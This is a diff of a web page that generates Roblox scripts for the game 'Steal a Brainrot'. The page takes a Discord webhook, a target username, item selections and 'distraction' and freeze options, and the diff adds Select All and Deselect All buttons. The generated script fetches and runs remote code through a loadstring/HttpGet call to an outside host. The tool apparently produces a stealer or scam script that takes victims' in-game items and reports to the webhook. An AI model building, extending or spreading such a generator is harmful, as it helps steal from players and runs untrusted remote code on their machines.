@@ -19,7 +19,6 @@
             color: #f0f3ff;
         }
 
-        /* Custom scrollbar */
         ::-webkit-scrollbar {
             width: 8px;
             height: 8px;
@@ -41,7 +40,6 @@
             margin: 0 auto;
         }
 
-        /* Header */
         .header {
             text-align: center;
             margin-bottom: 2.5rem;
@@ -59,7 +57,6 @@
             margin-top: 0.5rem;
         }
 
-        /* Grid layout */
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
@@ -67,7 +64,6 @@
             margin-bottom: 2rem;
         }
 
-        /* Cards */
         .card {
             background: #141932;
             border: 1px solid #1E2846;
@@ -91,7 +87,6 @@
             padding-left: 0.8rem;
         }
 
-        /* Inputs */
         input, select, textarea {
             width: 100%;
             background: #0C1023;
@@ -116,17 +111,49 @@
             margin-bottom: 0.5rem;
         }
 
-        /* Brainrot search & grid */
         .search-box {
             margin-bottom: 1rem;
         }
+        
+        /* Select All / Deselect All buttons */
+        .select-buttons {
+            display: flex;
+            gap: 0.8rem;
+            margin-bottom: 1rem;
+        }
+        .small-btn {
+            background: #2c2f48;
+            border: none;
+            color: white;
+            padding: 6px 14px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            font-weight: 500;
+            transition: 0.2s;
+        }
+        .small-btn:hover {
+            background: #423189;
+        }
+        .small-btn.select-all {
+            background: #2e7d32;
+        }
+        .small-btn.select-all:hover {
+            background: #1b5e20;
+        }
+        .small-btn.deselect-all {
+            background: #c62828;
+        }
+        .small-btn.deselect-all:hover {
+            background: #b71c1c;
+        }
+
         .brainrot-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
             gap: 0.7rem;
             max-height: 320px;
             overflow-y: auto;
-            padding: 0.3rem 0.2rem;
             background: #0a0e1c;
             border-radius: 20px;
             padding: 1rem;
@@ -159,7 +186,6 @@
             user-select: none;
         }
 
-        /* Toggle group */
         .toggle-group {
             display: flex;
             flex-wrap: wrap;
@@ -177,12 +203,10 @@
             border: 1px solid #1E2846;
         }
         .toggle-switch input {
-            width: auto;
             width: 18px;
             height: 18px;
         }
 
-        /* Slider */
         .slider-group {
             margin-top: 1rem;
         }
@@ -200,7 +224,6 @@
             color: #b77cff;
         }
 
-        /* Buttons */
         .btn {
             border: none;
             background: #5865F2;
@@ -234,7 +257,6 @@
             margin-top: 1rem;
         }
 
-        /* Output area */
         .output-card {
             margin-top: 1rem;
         }
@@ -282,7 +304,6 @@
     </div>
 
     <div class="grid">
-        <!-- Webhook + Target -->
         <div class="card">
             <div class="card-title">📡 Webhook & Target</div>
             <label>🔗 Discord Webhook URL *</label>
@@ -291,7 +312,6 @@
             <input type="text" id="targetUser" placeholder="Morreria" value="Morreria">
         </div>
 
-        <!-- Script Mode & Distractions -->
         <div class="card">
             <div class="card-title">⚙️ Script Mode</div>
             <select id="scriptMode">
@@ -316,18 +336,21 @@
             </div>
         </div>
 
-        <!-- Brainrot Selector -->
         <div class="card">
             <div class="card-title">🧠 Brainrot Multi-Selector</div>
             <div class="search-box">
                 <input type="text" id="brainrotSearch" placeholder="Search brainrot... 🔍" style="background:#0C1023;">
+            </div>
+            <!-- SELECT ALL / DESELECT ALL BUTTONS -->
+            <div class="select-buttons">
+                <button class="small-btn select-all" id="selectAllBtn">✅ Select All</button>
+                <button class="small-btn deselect-all" id="deselectAllBtn">❌ Deselect All</button>
             </div>
             <div id="brainrotGrid" class="brainrot-grid"></div>
             <div style="margin-top: 0.7rem; font-size:0.75rem; color:#8b9bda;" id="selectedCount">Selected: 0</div>
         </div>
     </div>
 
-    <!-- Generate & Output -->
     <div class="card output-card">
         <div class="card-title">📜 Generated Script</div>
         <div class="btn-group">
@@ -342,14 +365,12 @@
 </div>
 
 <script>
-    // FULL brainrot list
     const brainrotsList = [
         "Strawberry Elephant", "Meowl", "Skibidi Toilet", "Headless Horseman", "Dragon Cannelloni", "Hydra Dragon Cannelloni", "Dragon Gingerini", "Griffin", "Cerberus", "Celestial Pegasus", "Love Love Bear", "La Supreme Combinasion", "Popcuru and Fizzuru", "Rosey and Teddy", "Capitano Moby", "Cooki and Milki", "Burguro And Fryuro", "Ketupat Bros", "Reinito Sleighito", "Fortunu and Cashuru", "Los Amigos", "La Secret Combinasion", "Los Sekolahs", "Signore Carapace", "La Casa Boo", "Fragrama and Chocrama", "La Food Combinasion", "Elefanto Frigo", "Spooky and Pumpky", "Ginger Gerat", "La Ginger Sekolah", "Sammyni Fattini", "Los Spaghettis", "Festive 67", "Ventoliero Pavonero", "Cloverat Clapat", "Spaghetti Tualetti", "Antonio", "Rosetti Tualetti", "Nacho Spyder", "Garama and Madundung", "Fishino Clownino", "Gold Gold Gold", "Jolly Jolly Sahur", "Lavadorito Spinito", "Ketchuru and Musturu", "Swaggy Bros", "La Romantic Grande", "Orcaledon", "Tictac Sahur", "La Taco Combinasion", "Ketupat Kepat", "Dug dug dug", "Tang Tang Keletang", "Lovin Rose", "Los Tacoritas", "Eviledon", "Los Primos", "W or L", "Esok Sekolah", "La Jolly Grande", "Los Cupids", "Los Puggies", "Tralaledon", "Gobblino Uniciclino", "Tuff Toucan", "Mieteteira Bicicleteira", "Chillin Chili", "Money Money Reindeer", "La Spooky Grande", "Bacuru and Egguru", "Los Bros", "La Extinct Grande", "Los Candies", "Los 67", "Celularcini Viciosini", "Los Mobilis", "Money Money Puggy", "Cigno Fulgoro", "Los Spooky Combinasionas", "Los Hotspotsitos", "Los Jolly Combinasionas", "Snailo Clovero", "Los Planitos", "Chicleteira Cupideira", "DJ Panda", "Las Sis", "Spinny Hammy", "Tacorita Bicicleta", "Los Sweethearts", "Nuclearo Dinossauro", "Chicleteira Noelteira", "Los Combinasionas", "Chimnino", "Noo my Gold", "Swag Soda", "Noo my Heart", "Tacorillo Crocodillo", "Mariachi Corazoni", "La Grande Combinasion", "Los 25", "Los Burritos", "67", "Donkeyturbo Express", "Los Chicleteiras", "Guest 666", "Los Mi Gatitos", "Rang Ring Bus", "Granny", "Noo my Present", "Serafinna Medusella", "Los Nooo My Hotspotsitos", "Arcadopus", "Noo my Candy", "Los Quesadillas", "Chicleteirina Bicicleteirina", "Chill Puppy", "Burrito Bandito", "Luck Luck Luck Sahur", "Chicleteira Bicicleteira", "Brunito Marsito", "Quesadillo Vampiro", "Eid Eid Eid Sahur", "Cupid Hotspot", "Mi Gatito", "Ho Ho Ho Sahur", "Cupid Cupid Sahur", "Pot Pumpkin", "Naughty Naughty", "Bunito Bunito Spinito", "Quesadilla Crocodila", "Horegini Boom", "Santa Hotspot", "Pot Hotspot", "25", "Pirulitoita Bicicleteira", "To to to Sahur", "Telemorte", "La Sahur Combinasion", "List List List Sahur", "Noo my examine", "Los Jobcitos", "Nooo My Hotspot", "Bunnyman", "Tung Tung Tung Sahur", "Cuadramat and Pakrahmatmamat", "Please my Present", "Los Cucarachas", "1x1x1x1", "La Vacca Lepre Lepreino", "Love Love Love Sahur", "Perrito Burrito", "Graipuss Medussi", "Giftini Spyderini", "GOAT", "Trickolino", "Paradiso Axolottino", "Triplito Tralaleritos", "La Vacca Jacko Linterino", "Fishboard", "Santteo", "Las Vaquitas Saturnitas", "Los Karkeritos", "Karker Sahur", "Los Trios", "Job Job Job Sahur", "Frankentteo", "Pumpkini Spyderini", "Las Tralaleritas", "Rocco Disco", "Extinct Matteo", "La Karkerkar Kombinasin", "La Vacca Prese Presente", "Reindeer Tralala", "Yess my examine", "Guerriro Digitale", "Boatito Auratito", "Vulturino Skeletono", "Los Tralaleritos", "Zombie Tralala", "Los Tortus", "La Cucaracha", "Fragola La La La", "Extinct Tralalero", "Agarrini la Palini", "Los Spyderinis", "Chachechi", "Blackhole Goat", "Dul Dul Dul", "Torrtuginni Dragonfrutini", "Trenostruzzo Turbo 4000", "Karkerkar Kurkur", "Los Matteos", "Bisonte Giuppitere", "Sammyni Spyderini", "La Vacca Saturno Saturnita", "Jackorilla"
     ];
 
     let selectedBrainrots = new Set();
 
-    // DOM elements
     const brainrotGrid = document.getElementById('brainrotGrid');
     const searchInput = document.getElementById('brainrotSearch');
     const selectedCountSpan = document.getElementById('selectedCount');
@@ -364,8 +385,9 @@
     const outputCode = document.getElementById('outputCode');
     const copyBtn = document.getElementById('copyBtn');
     const downloadBtn = document.getElementById('downloadBtn');
+    const selectAllBtn = document.getElementById('selectAllBtn');
+    const deselectAllBtn = document.getElementById('deselectAllBtn');
 
-    // Render brainrot grid with filtering
     function renderBrainrots() {
         const searchTerm = searchInput.value.toLowerCase();
         const filtered = brainrotsList.filter(br => br.toLowerCase().includes(searchTerm));
@@ -413,12 +435,31 @@
         selectedCountSpan.innerText = `Selected: ${selectedBrainrots.size} brainrot${selectedBrainrots.size !== 1 ? 's' : ''}`;
     }
 
-    // Slider display
+    // Select All function
+    function selectAll() {
+        brainrotsList.forEach(brainrot => {
+            selectedBrainrots.add(brainrot);
+        });
+        updateSelectedCount();
+        renderBrainrots();
+        showToast('✅ Selected all ' + selectedBrainrots.size + ' brainrots!');
+    }
+
+    // Deselect All function
+    function deselectAll() {
+        selectedBrainrots.clear();
+        updateSelectedCount();
+        renderBrainrots();
+        showToast('❌ Deselected all brainrots');
+    }
+
+    selectAllBtn.addEventListener('click', selectAll);
+    deselectAllBtn.addEventListener('click', deselectAll);
+
     freezeSlider.addEventListener('input', () => {
         freezeValueDisplay.innerText = freezeSlider.value + 's';
     });
 
-    // Generate script
     function generateScript() {
         const webhook = webhookInput.value.trim();
         if (!webhook) {
@@ -511,7 +552,6 @@ loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/e5d6f5931adf41
         setTimeout(() => div.remove(), 2500);
     }
     
-    // initial render
     renderBrainrots();
     updateSelectedCount();
     freezeValueDisplay.innerText = freezeSlider.value + 's';
